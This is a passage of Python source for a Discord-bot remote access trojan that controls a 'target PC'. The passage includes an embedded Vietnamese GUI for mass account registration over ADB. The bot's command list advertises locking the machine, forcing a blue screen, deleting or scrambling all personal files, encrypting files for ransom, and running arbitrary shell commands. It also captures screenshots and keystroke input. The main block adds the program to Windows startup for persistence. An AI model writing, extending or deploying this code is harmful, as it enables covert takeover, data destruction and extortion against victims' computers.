                            sx1 = int(round(x1 / scale))
                            sy1 = int(round(y1 / scale))
                            sx2 = int(round(x2 / scale))
                            sy2 = int(round(y2 / scale))
                            height, width = self.scanner_screen.shape[:2]
                            sx1 = max(0, min(width, sx1))
                            sx2 = max(0, min(width, sx2))
                            sy1 = max(0, min(height, sy1))
                            sy2 = max(0, min(height, sy2))
                            if sx2 <= sx1 or sy2 <= sy1:
                                raise AppError("Vùng chọn chưa hợp lệ.")
                            crop = self.scanner_screen[sy1:sy2, sx1:sx2].copy()
                            center = [int(round((sx1 + sx2) / 2)), int(round((sy1 + sy2) / 2))]
                            self.template_store.save_entry(role, crop, screen_size=[int(width), int(height)], rect=[sx1, sy1, sx2, sy2], center=center, source="scanner")
                            self.action_point_state[role] = "done"
                            self.refresh_action_points()
                            self.selection_var.set(f"Đã lưu {IMAGE_TEMPLATE_ROLES[role]}.")
                            self.add_log_entry(f"Đã lưu {IMAGE_TEMPLATE_ROLES[role]}.", "success")
                        except Exception as exc:
                            self.show_error("Chưa lưu được mốc", exc)
                    
                    def check_action_point(self, role):
                        try:
                            config_dict = self.collect_config_from_ui()
                            device = self.first_selected_device()
                            image, _entry = self.template_store.load_template_source(role)
                            screen = adb_screenshot_image(str(config_dict.get("adb_path", "adb")), device)
                            match = find_template_match(screen, image, float(config_dict["threshold"]))
                            if match:
                                self.action_point_state[role] = "done"
                                self.add_log_entry(f"{IMAGE_TEMPLATE_ROLES[role]} đã sẵn sàng.", "success")
                            else:
                                self.action_point_state[role] = "warning"
                                self.last_error_var.set("Không tìm thấy mốc đã chọn trên màn hình hiện tại.")
                                self.add_log_entry("Không tìm thấy mốc đã chọn trên màn hình hiện tại.", "warning")
                        except Exception as exc:
                            self.action_point_state[role] = "warning"
                            self.show_error("Kiểm tra mốc chưa hoàn tất", exc)
                        self.update_dashboard_state()
                    
                    def test_selected_device(self):
                        for role in IMAGE_TEMPLATE_ROLES:
                            self.check_action_point(role)
                    
                    def logout_license(self):
                        if not messagebox.askyesno("Đăng xuất key", "Bạn có chắc muốn đăng xuất key trên máy này?"):
                            return
                        self.license_active = False
                        self.license_badge_var.set("License Off")
                        self.license_badge.configure(bg=THEME["red"], fg="#160408")
                        self.add_log_entry("Key đã đăng xuất. Vui lòng kích hoạt lại trước khi chạy.", "warning")
                        self.update_dashboard_state()
                    
                    def toggle_pause(self):
                        if not self.running:
                            return
                        if self.pause_event.is_set():
                            self.pause_event.clear()
                            self.pause_button.configure(text="Tạm dừng")
                            self.add_log_entry("Đã tiếp tục quy trình đăng kí.", "success")
                        else:
                            self.pause_event.set()
                            self.pause_button.configure(text="Tiếp tục")
                            self.add_log_entry("Đã tạm dừng quy trình đăng kí.", "warning")
                    
                    def stop_after_current(self):
                        self.stop_after_current_event.set()
                        self.add_log_entry("Sẽ dừng sau tài khoản hiện tại.", "warning")
                    
                    def stop_runner(self):
                        self.stop_event.set()
                        self.pause_event.clear()
                        self.add_log_entry("Đã yêu cầu dừng ngay.", "warning")
                        self.update_dashboard_state()
                    
                    def start_runner(self):
                        if self.runner_thread and self.runner_thread.is_alive():
                            return
                        prepared, missing, _states = self.readiness()
                        if missing:
                            self.show_error("Chưa sẵn sàng", "Bạn cần " + ", ".join(missing) + " trước.")
                            return
                        try:
                            config_dict = self.collect_config_from_ui()
                            save_config(config_dict)
                            self.config_data = config_dict
                            devices = self.selected_devices()
                            templates, metadata = self.template_store.load_all(required=True)
                            accounts = list(self.imported_accounts)
                        except Exception as exc:
                            self.show_error("Chưa bắt đầu được", exc)
                            return
                        self.stop_event = threading.Event()
                        self.pause_event = threading.Event()
                        self.stop_after_current_event = threading.Event()
                        self.running = True
                        self.run_started_at = time.time()
                        self.success_accounts.clear()
                        self.failed_accounts.clear()
                        self.current_account_text = "-"
                        self.current_step_text = "-"
                        self.current_step_key = ""
                        self.workflow_state = {key: "pending" for key, _title, _hint in REGISTRATION_WORKFLOW}
                        self.workflow_hints = {key: hint for key, _title, hint in REGISTRATION_WORKFLOW}
                        for key in self.workflow_rows:
                            self.set_workflow_step(key, "pending")
                        self.add_log_entry(f"Bắt đầu đăng kí với {len(devices)} thiết bị và {len(accounts)} tài khoản.", "success")
                        self.update_dashboard_state()
                        
                        def worker():
                            error = None
                            try:
                                runner = ImageLoginRunner(
                                    adb_path=str(config_dict.get("adb_path", "adb")),
                                    devices=devices,
                                    accounts=accounts,
                                    templates=templates,
                                    metadata=metadata,
                                    config=config_dict,
                                    stop_event=self.stop_event,
                                    pause_event=self.pause_event,
                                    stop_after_current_event=self.stop_after_current_event,
                                    log=lambda message: self.log(message, "success"),
                                    account_done=lambda account: self.ui_queue.put(("account_done", account)),
                                    account_failed=lambda account, exc: self.ui_queue.put(("account_failed", (account, exc))),
                                    workflow_update=lambda key, status, hint: self.ui_queue.put(("workflow", (key, status, hint))),
                                    current_account_update=lambda account: self.ui_queue.put(("current_account", account)),
                                    device_labels=self.device_display_names,
                                )
                                runner.run()
                            except Exception as exc:
                                error = exc
                            self.ui_queue.put(("runner_done", error))
                        
                        self.runner_thread = threading.Thread(target=worker, daemon=True, name="register-runner")
                        self.runner_thread.start()
                    
                    def runner_finished(self, error):
                        self.running = False
                        self.pause_event.clear()
                        if error:
                            message = friendly_error(error)
                            self.last_error_var.set(message)
                            self.add_log_entry(message, "error")
                        else:
                            self.add_log_entry("Quy trình đăng kí đã hoàn tất.", "success")
                        self.update_dashboard_state()
                    
                    def append_result(self, status, account, message):
                        ensure_dirs()
                        with RESULT_PATH.open("a", encoding="utf-8") as f:
                            f.write(f"{now_text()}|{status}|{account.to_line()}|{message}\n")
                    
                    def open_result_file(self):
                        ensure_dirs()
                        if not RESULT_PATH.exists():
                            RESULT_PATH.write_text("", encoding="utf-8")
                        if os.name == "nt":
                            os.startfile(str(RESULT_PATH))
                        else:
                            subprocess.Popen(["xdg-open", str(RESULT_PATH)])
                    
                    def copy_success_accounts(self):
                        text = "\n".join(account.to_line() for account in self.success_accounts)
                        self.clipboard_clear()
                        self.clipboard_append(text)
                        self.add_log_entry("Đã copy tài khoản thành công.", "success")
                    
                    def view_failed_accounts(self):
                        if not self.failed_accounts:
                            messagebox.showinfo("Tài khoản lỗi", "Chưa có tài khoản lỗi.")
                            return
                        text = "\n".join(f"{account.username}: {reason}" for account, reason in self.failed_accounts[:80])
                        messagebox.showwarning("Tài khoản lỗi", text)
                    
                    def copy_logs(self):
                        text = "\n".join(f"{entry['time']} [{LOG_FILTERS.get(entry['level'], 'Thành công')}] {entry['message']}" for entry in self.log_entries)
                        self.clipboard_clear()
                        self.clipboard_append(text)
                        self.add_log_entry("Đã copy nhật ký hoạt động.", "success")
                    
                    def clear_logs(self):
                        self.log_entries.clear()
                        self.last_error_var.set("Chưa có lỗi.")
                        self.render_logs()
                    
                    def update_runtime(self):
                        self.bottom_runtime_var.set(f"Thời gian chạy: {elapsed_text(self.run_started_at)}")
                        self.after(1000, self.update_runtime)
                
                def parse_account_import(text):
                    valid = []
                    invalid = []
                    for number, raw_line in enumerate(text.splitlines(), start=1):
                        line = raw_line.strip()
                        if not line or line.startswith("#"):
                            continue
                        delimiter = None
                        for candidate in ("|", "\t", ",", ";"):
                            if candidate in line:
                                delimiter = candidate
                                break
                        if delimiter is None:
                            invalid.append((number, line))
                            continue
                        parts = [part.strip() for part in line.split(delimiter)]
                        if len(parts) < 3 or not parts[0] or not parts[1] or not parts[2]:
                            invalid.append((number, line))
                            continue
                        display_name = parts[3] if len(parts) >= 4 and parts[3] else f"AOVUser{number:04d}"
                        valid.append(Account(username=parts[0], password=parts[1], email=parts[2], display_name=display_name))
                    return valid, invalid
                
                app = HHHAutoRegisterApp()
                app.mainloop()
            except Exception as e:
                import traceback
                traceback.print_exc()
        
        # Run GUI in separate thread
        gui_thread = threading.Thread(target=run_gui, daemon=True)
        gui_thread.start()
        await send_embed(ctx, "HHH Tool Started", "Image Login Tool GUI has been launched on the target machine.", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "HHH Error", f"Failed to start HHH tool: {str(e)}", discord.Color.red())

@bot.command(name='exit')
@is_authorized()
async def exit(ctx):
    try:
        embed = discord.Embed(
            title="Exiting",
            description=f"Goodbye!",
            color=discord.Color.dark_grey()
        )
        await ctx.send(embed=embed)
        time.sleep(1)
        sys.exit(0)
    except Exception as e:
        await send_embed(ctx, "Command Error", f"Failed to run command: {str(e)}", discord.Color.red())

@bot.command(name='help')
async def rat_help(ctx):
    embed = discord.Embed(
        title="Commands",
        description="A list of commands you can run to control the target PC.",
        color=discord.Color.purple()
    )
    categories = {
        "Config": [
            f"**Prefix:** `{Config.PREFIX}`",
            f"**Whitelisted:** <@{Config.WHITELISTED}>",
            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
        ],
        "System Info": [
            "`info` - Get advanced system information",
        ],
        "Destructive": [
            "`lock` - Locks PC",
            "`crash` - Blue screens PC",
            "`filescramble` - Renames all files randomly",
            "`filedestroy` - Deletes all personal files",
            "`fileransom` - Encrypts all files",
            "`virus` - Fake virus messages",
        ],
        "Messages": [
            "`voice [message]` - Text-to-speech message",
            "`msgbox [message]` - Message box popup",
            "`rickroll` - Opens Rickroll video",
        ],
        "Control": [
            "`screenshot [name]` - Take screenshot",
            "`open <app>` - Open application",
            "`close <app>` - Close application",
            "`listapps [limit]` - List running apps",
            "`cmd [command]` - Run a cmd command",
            "`hhh` - Open HHH Image Login Tool GUI",
        ],
        "Mouse & Keyboard": [
            "`click [left|right|middle]` - Mouse click",
            "`press <keys>` - Press keys (ex: ctrl+c)"
        ],
        "Power Control": [
            "`shutdown [delay]` - Shutdown PC",
            "`restart [delay]` - Restart PC",
        ],
        "Media": [
            "`playpause` - Play/Pause media",
            "`nexttrack` - Next track"
        ],
        "Files": [
            "`listfiles [directory]` - List files"
        ],
        "Bot": [
            "`exit` - Closes the rat and exits."
        ],
        "Credits": [
            "-# Thanks to [Vn](<https://discord.com/users/1421939463164133590>), this product is brought to you for free!"
        ]
    }
    for category, commands in categories.items():
        embed.add_field(
            name=category,
            value="\n".join(commands),
            inline=False
        )
    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="Command Not Found",
            description=f"Use `{Config.PREFIX}help` for available commands.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.CheckFailure):
        pass
    else:
        embed = discord.Embed(
            title="An Error Occurred",
            description=f"```{str(error)}```",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

if __name__ == "__main__":
    if platform.system() == "Windows":
        if Config.STARTUP:
            add_to_startup()
    bot.run(Config.TOKEN)